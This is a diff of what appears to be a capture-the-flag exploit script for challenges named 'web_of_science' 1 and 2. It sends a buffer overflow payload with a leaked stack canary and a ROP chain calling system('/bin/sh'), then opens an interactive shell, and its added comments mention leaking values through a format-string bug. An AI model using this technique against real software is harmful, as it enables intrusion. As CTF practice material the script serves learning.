@@ -77,7 +77,7 @@ def addpaper(p,data=None,canary=None,system=None,binsh=None):
         p.recvul(">")
         p.sendl("4")
         p.recvul(":")
-        p.sendl("A"*72+pk64(canary)+"B"*8+pk64(0x4010a3) + pk64(binsh) + pk64(system))
+        p.sendl("A"*72+pk64(canary)+"B"*8+pk64(gadget1) + pk64(binsh) + pk64(system))
         #p.sendl("A"*72+pk64(cananry)+"B"*8+system)
         
 
@@ -165,6 +165,10 @@ p.sendl("6")
 p.interactive()
 
 """
+#rop works for both 1 and 2. 
+#I did not realize first chall was meant to solve with shellcode but i decide to use rop which is required in web_of_science2.
+#Only few difference between first and second. You still can leak using format vuln and they added the category "url" and "size" in add paper function
+
 
 p.recvl()
 p.sendl("Hello")
